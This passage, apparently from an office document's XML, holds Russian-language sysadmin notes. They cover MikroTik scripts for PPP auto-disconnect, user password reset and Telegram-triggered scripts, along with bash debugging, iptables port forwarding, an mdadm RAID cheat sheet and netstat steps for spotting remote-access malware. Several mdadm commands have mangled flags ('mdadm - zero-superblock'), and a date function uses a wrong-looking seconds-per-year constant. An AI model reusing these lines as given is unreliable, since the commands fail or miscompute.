      <text:p text:style-name="P1"><text:span text:style-name="T1"># поэтому в скрипте сделан обход удаления данного соединения (задаётся в adminClient, должен соответствовать ppp secret)</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">:local adminClient "you ppp secret admins` name"</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">:local pppTest value=[/ppp active find];</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">:local pingNumber value=2;</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">:local pingMin value=1;</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">:foreach userTest in=$pppTest do={</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"><text:s/>:local pingOk value=[:ping [/ppp active get $userTest value-name=address] count=$pingNumber]</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P8" loext:marker-style-name="T2"><text:span text:style-name="T3"><text:s/>:if (($pingOk &lt; $pingMin) &amp;&amp; ([/ppp active get $userTest value-name=name]!=$adminClient)) do={</text:span></text:p>
      <text:p text:style-name="P8" loext:marker-style-name="T2"><text:span text:style-name="T3"><text:s text:c="2"/>:log warning message=([/ppp active get $userTest value-name=service] . " auto disconnected: ". $pingOk . " ping ok over " . $pingNumber . " " . [/ppp active get $userTest value-name=name] . " " . [/ppp active get $userTest value-name=address])</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">/ppp active remove $userTest</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"><text:s/>}</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">}</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">если нужно проверять только определенный вид ppp замените строку :</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"># :local pppTest value=[/ppp active find];</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">на</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">строку</text:span><text:span text:style-name="T3">, </text:span><text:span text:style-name="T1">например</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"># :local pppTest value=[/ppp active find where service=pptp];</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T1">Для использования поставьте этот скрипт в Планировщик с нужным интервалом (оптимально не менее 30 сек).</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Как отлаживать bash-script-ы по шагам:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T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span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">#!/bin/bash</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">trap 'echo "# $BASH_COMMAND";read' DEBUG</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">echo line1</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">echo line2</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">echo line3</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Процесс отладки</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Запускаем скрипт, перед выполнением каждой команды выводится то, что будет исполняться, затем интерпретатор начинает ожидать нажатия клавиши &lt;ENTER&gt;.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Если понимаем, что что-то пошло не так, нажимаем Ctrl+C и выходим из отладки.</text:span></text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:span text:style-name="T1">Ингредиенты</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">команда trap, которая умеет перехватывать разные сигналы и в нашем случае она перехватывает сигнал DEBUG, посылаемый перед выполнением команды</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">команда read, которая умеет ожидать ввода чего-нибудь с клавиатуры (в данном случае нам нужно только либо ENTER либо Ctrl+C</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">переменная окружения $BASH_COMMAND, валидная внутри обработчика команды trap.</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"># <text:s text:c="28"/>Online Bash Shell.</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"># <text:s text:c="16"/>Code, Compile, Run and Debug Bash script online.</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"># Write your code in this editor and press "Run" button to execute it.</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">trap 'echo "# $BASH_COMMAND";read' DEBUG</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">echo line1</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">echo line2</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">echo line3</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P5" loext:marker-style-name="T2"><text:span text:style-name="T3">echo "Hello World";</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">Top+ SQL </text:span><text:span text:style-name="T1">вопросов</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">интервью</text:span><text:span text:style-name="T3"> </text:span></text:p>
      <text:p text:style-name="P8" loext:marker-style-name="T2"><text:span text:style-name="T3">1. Database and SQL - https://bit.ly/3zGK6S7</text:span></text:p>
      <text:p text:style-name="P8" loext:marker-style-name="T2"><text:span text:style-name="T3">2. SQL Query - https://bit.ly/3bGzN8r</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">3. MySQL - https://bit.ly/3bFkhtE</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">4. SQL Server - https://bit.ly/3A5qIj0</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">5. PostgreSQL - https://bit.ly/3BOLLHP</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P5" loext:marker-style-name="T2"><text:span text:style-name="T3">6. Oracle - https://bit.ly/3zF2WsH</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Скриптик переустановки пароля пользователя MikroTik</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># Скрипт смены пароля пользователя</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># только для исполнения в терминале ROS</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"># by Sertik 09/06/2020</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">{</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">:global EnterString do={</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">:local cont 0; :local string ""</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">:while ($cont!=13) do={</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">:local key ([:terminal inkey])</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">:if ($key!=13) do={</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">:local char [[:parse "(\"\\$[:pick "0123456789ABCDEF" (($key &gt;&gt; 4) &amp; 0xF)]$[:pick "0123456789ABCDEF" ($key &amp; 0xF)]\")"]]</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">:set string ("$string"."$char")}</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">:set cont $key</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">}</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">:return $string}</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">;</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">:put "Please, enter Username:"</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">:local RegUser [$EnterString];</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">:put "";</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:soft-page-break/><text:span text:style-name="T3">:if ([:len [/user find disabled=no name=$RegUser]]!=0) do={:put "Ok, a user with this name was found"; :put "";</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">:put "Please, enter new password for this user:"</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">:local newPass [$EnterString];</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">[/user remove $RegUser];</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">[/user add name=$RegUser password=$newPass group=full];</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">:put "";</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">:put "The user has been re-created, the password has been changed";</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">:put ("New user`s password: "."$newPass");</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">:put "Don't forget to set up access restrictions based on ip addresses";</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"><text:s text:c="2"/>} else={:put ("User "."$RegUser "."not found"); :put "";</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"><text:s/></text:span><text:span text:style-name="T1">}</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">}</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Скрипт интересен строкой преобразования кода символа из переменной $key, сграбленного с клавиатуры терминала, в сам символ.</text:span></text:p>
      <text:p text:style-name="P5" loext:marker-style-name="T2"><text:span text:style-name="T3">:local char [[:parse "(\"\\$[:pick "0123456789ABCDEF" (($key &gt;&gt; 4) &amp; 0xF)]$[:pick "0123456789ABCDEF" ($key &amp; 0xF)]\")"]]</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P8"><text:span text:style-name="T1">Как пробросить порт в Linux на другой сервер? Необходимо пробросить с 8821 порта сервера 10.10.10.10 на 21 порт сервера 12.12.12.12:</text:span></text:p>
      <text:p text:style-name="P8"><text:span text:style-name="T3">iptables -A FORWARD --dst 10.10.10.10 -p tcp --dport 8821 -j ACCEPT</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">iptables -A FORWARD --src 10.10.10.10 -p tcp --sport 8821 -j ACCEPT</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">iptables -t nat -A PREROUTING -d 10.10.10.10 -p tcp --dport 8821 -j DNAT --to-destination 12.12.12.12:21</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">iptables -t nat -A POSTROUTING -d 12.12.12.12 -p tcp --dport 21 -j SNAT --to-source 10.10.10.10:8821</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T1">#iptables</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Шпаргалка по RAID</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">mdadm - утилита для работы с программными RAID-массивами различных уровней. В данной инструкции рассмотрим примеры ее использования.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Информация о RAID</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">cat /proc/mdstat - состояние всех RAID</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">mdadm -D /dev/md0 - подробная инфа о конкретном RAID</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">lsblk - список дисков с разделами, местом, типом</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">df -hT - свободное место, тип файловой системы, точки монтирования</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Сборка RAID</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">mdadm - zero-superblock - force /dev/sd{b,c} - обнуление суперблоков на дисках sdb sdc (для удаления инфы о других RAID)</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">при получении ответа mdadm: Unrecognised md component device - /dev/sdb значит, что диск не использовался для RAID, продолжаем</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">mdadm - create - verbose /dev/md0 -l 1 -n 2 /dev/sd{b,c}</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:span text:style-name="T1">*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text:span text:style-name="T1">Создание файловой системы и монтирование массива</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">mkfs.ext4 /dev/md0 - создание файловой системы ext4 на md0</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">mount /dev/md0 /mnt - разово примонтировать md0 к /mnt</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">nano /etc/fstab, прописать /dev/md0 /mnt ext4 defaults 1 2 - постоянное монтирование, работает после перезагрузки</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Восстановление RAID</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Замена жесткого диска</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">При выходе из строя, команда mdadm -D /dev/md0 выдаст: State : clean, degraded</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">mdadm /dev/md0 - remove /dev/sdc - удалить сбойный диск</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">mdadm /dev/md0 - add /dev/sde - добавить новый диск в массив</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Статус должен стать Rebuild Status : 40% complete и так до полного восстановления</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Пересборка массива</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Если нам нужно вернуть ранее разобранный или развалившийся массив из дисков, которые уже входили в состав RAID, вводим:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">mdadm - assemble - scan - команда сама найдет необходимую конфигурацию и восстановит RAID.</text:span></text:p>
      <text:p text:style-name="P8"><text:span text:style-name="T1">mdadm - assemble /dev/md0 /dev/sdb /dev/sdc - с указанием из каких дисков пересобрать</text:span></text:p>
      <text:p text:style-name="P8"><text:span text:style-name="T1">Запасной диск (Hot Spare)</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Если в массиве будет запасной диск для горячей замены, при выходе из строя одного из основных дисков, его место займет запасной.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">mdadm /dev/md0 - add /dev/sdd - Диском Hot Spare станет тот, который просто будет добавлен к массиву</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Добавить диск к массиву, расширить массив</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Добавление активного диска к RAID, который будет использоваться для работы, а не в качестве запасного.</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">mdadm /dev/md0 - add /dev/sde</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">mdadm -G /dev/md0 - raid-devices=3 - </text:span><text:span text:style-name="T1">расширяем</text:span><text:span text:style-name="T3"> RAID</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">* в данном примере подразумевается, что у нас RAID 1 и мы добавили к нему 3-й диск.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Установка mdadm</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Если каким-то образом в дистрибутиве нет этого пакета</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">apt-get install mdadm</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Удаление</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">массива</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Если нам нужно полностью разобрать RAID, сначала размонтируем и остановим его:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">umount /mnt</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">* где /mnt - каталог монтирования нашего RAID.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">mdadm -S /dev/md0</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Затем очищаем суперблоки на всех дисках, из которых он был собран:</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:soft-page-break/><text:span text:style-name="T3">mdadm - zero-superblock /dev/sdb</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">mdadm - zero-superblock /dev/sdc</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P5" loext:marker-style-name="T2"><text:span text:style-name="T3">mdadm - zero-superblock /dev/sdd</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Как</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">найти</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">вирус</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">удаленного</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">доступа</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">в</text:span><text:span text:style-name="T3"> Windows?</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T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span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Чтобы найти вирус:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">1. Запустите командную строку от имени администратора. Удобно открыть через ПКМ на иконку «Пуск».</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">2. Перейдите в директорию своего юзера, используя команду «cd C:\Users\&lt;ваш_юзернейм&gt;».</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">3. Введите команду «netstat -b». На экран начнут выводиться все подключения ваших программ, а так же их IP-адреса.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">4. Если нашли незнакомый подозрительный процесс, введите команду «netstat -nbo», чтобы узнать PID этого процесса.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">5. Затем выполните команду «taskkill /PID &lt;pid_вашего_процесса&gt; /F», чтобы убить процесс.</text:span></text:p>
      <text:p text:style-name="P9"><text:span text:style-name="T1">В случае обнаружения вируса вы также увидите IP адрес прокси сервера, через который он имеет доступ к компьютеру. Это может оказаться полезным.</text:span></text:p>
      <text:p text:style-name="P9"><text:span text:style-name="T1">Удаленный запуск скриптов через Телеграм в Mikrotik</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T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span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">1. Работа скрипта привязана к текущему времени, по этой причине на роутере должны быть правильно выставлены время и часовой пояс.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T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span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T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span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Сам</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">скрипт</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">ниже</text:span><text:span text:style-name="T3">:</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"># Script remote activation script via Telegram by drPioneer</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:soft-page-break/><text:span text:style-name="T3"># https://forummikrotik.ru/viewtopic.php?p=78085</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"># tested on ROS 6.48</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"># updated 2021/04/05</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">:do {</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"><text:s text:c="4"/>:local botID <text:s text:c="3"/>"botXXXXXXXXXX:XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX";</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"><text:s text:c="4"/>:local myChatID "-XXXXXXXXX";</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"><text:s text:c="4"/># Telegram messenger response parsing function by Dimonw</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"><text:s text:c="4"/># https://habr.com/ru/post/482802/</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"><text:s text:c="4"/>:local parse do={</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"><text:s text:c="8"/>:local variaMod ("\"".$variable);</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"><text:s text:c="8"/>:local startLoc ([:find $content $variaMod -1] + [:len $variaMod] + 2);</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"><text:s text:c="8"/>:local commaLoc ([:find $content "," $startLoc]);</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"><text:s text:c="8"/>:local brakeLoc ([:find $content "}" $startLoc]);</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"><text:s text:c="8"/>:local endLoc $commaLoc;</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"><text:s text:c="8"/>:local startSymbol [:pick $content $startLoc]; </text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"><text:s text:c="8"/>:if ($brakeLoc != 0 and ($commaLoc = 0 or $brakeLoc &lt; $commaLoc)) do={ :set endLoc $brakeLoc; };</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"><text:s text:c="8"/>:if ($startSymbol = "{") do={ :set endLoc ($brakeLoc + 1); };</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"><text:s text:c="8"/>:if ($quotas = true) do={</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"><text:s text:c="12"/>:set startLoc ($startLoc + 1);</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"><text:s text:c="12"/>:set endLoc <text:s text:c="2"/>($endLoc - 1);</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"><text:s text:c="8"/>}</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"><text:s text:c="8"/>:if ($endLoc &lt; $startLoc) do={ :set endLoc ($startLoc + 1); };</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P8" loext:marker-style-name="T2"><text:span text:style-name="T3"><text:s text:c="8"/>:local message [:pick $content $startLoc $endLoc];</text:span></text:p>
      <text:p text:style-name="P8" loext:marker-style-name="T2"><text:span text:style-name="T3"><text:s text:c="8"/>:return $message;</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"><text:s text:c="4"/>}</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"><text:s text:c="4"/># UNIX time conversion function to normal view by Pepelxl</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"><text:s text:c="4"/># https://forummikrotik.ru/viewtopic.php?t=11636</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"><text:s text:c="4"/>:local unixTime do={</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"><text:s text:c="8"/>:local dateY <text:s/>($timeStamp / 31436000 + 1970);</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"><text:s text:c="8"/>:local dateM (($dateY - 1969) / 4);</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"><text:s text:c="8"/>:local dateD (($timeStamp / 86400 - $dateM) % 365);</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"><text:s text:c="8"/>:local days <text:s text:c="2"/>[:toarray (31,28,31,30,31,30,31,31,30,31,30,31)];</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"><text:s text:c="8"/>:local months [:toarray ("jan","feb","mar","apr","may","jun","jul","aug","sep","oct","nov","dec")];</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"><text:s text:c="8"/>:if ($dateY % 4 = 0) do={ :set ($days-&gt;1) 29; }</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"><text:s text:c="8"/>do {</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"><text:s text:c="12"/>:for i from=0 to=11 do={ </text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"><text:s text:c="16"/>:if (($days-&gt;$i) &gt; $dateD) do={ </text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"><text:s text:c="20"/>:set $dateM ($i); </text:span><text:span text:style-name="T3"/></text:p>
